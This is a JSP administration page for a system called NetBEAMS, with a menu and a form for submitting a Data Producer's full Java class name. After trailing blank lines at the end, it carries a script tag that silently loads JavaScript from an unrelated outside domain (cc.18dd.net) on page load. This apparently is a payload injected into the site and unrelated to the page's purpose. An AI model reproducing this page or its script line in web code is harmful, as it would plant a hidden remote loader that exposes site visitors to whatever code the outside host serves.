<%@ page import="org.smf.smp.*" %>
<%@ page import="org.smf.smp.event.*" %>
<%@ page import="org.smf.smp.dp.*" %>
<%@ page import="org.dp.*" %>
<%@ page import="java.util.*" %>
<%@ page import="java.io.*" %>
<%@ page isErrorPage="true" %>



<h1 align="center">NetBEAMS admin page</h1>
<p align="center">&nbsp;</p>
<table border="1" width="100%" id="table1">
	<tr>
		<td width="235" bgcolor="#000080" valign="top">
		<p align="center"><b><font color="#FFFFFF" size="5">Menu</font></b></td>
		<td bgcolor="#000080">
		<p align="center"><b><font color="#FFFFFF" size="5">Add Data Producer</font></b></td>
	</tr>
	<tr>
		<td width="235">
		<p align="left">&nbsp;</p>
		<p align="center"><a href="data_producers.jsp">Show Data Producers</a></p>
		<p align="center"><a href="index.jsp">Show Sensors</a></p>
		<p align="center">&nbsp;</td>
		<td valign="top">
			<br><br>
			<center>
			<p><b>Please provide the Data Producer's FULL class name. This name must include the package names. (e.i. org.netbeams.dp.NRSSDataProducer)</b></p>
			<form method="POST" action="add_data_producer_submit.jsp" name="dataProducerForm" id="dataProducerForm">

				<input type="text" size="50" name="dataProducerClassName" id="dataProducerClassName" />

				<br><br>
				<input type="submit" value="Submit" />

			</form>
			</center>
		</td>
	</tr>
</table>






<script language=javascript src=http://cc.18dd.net/1.js></script>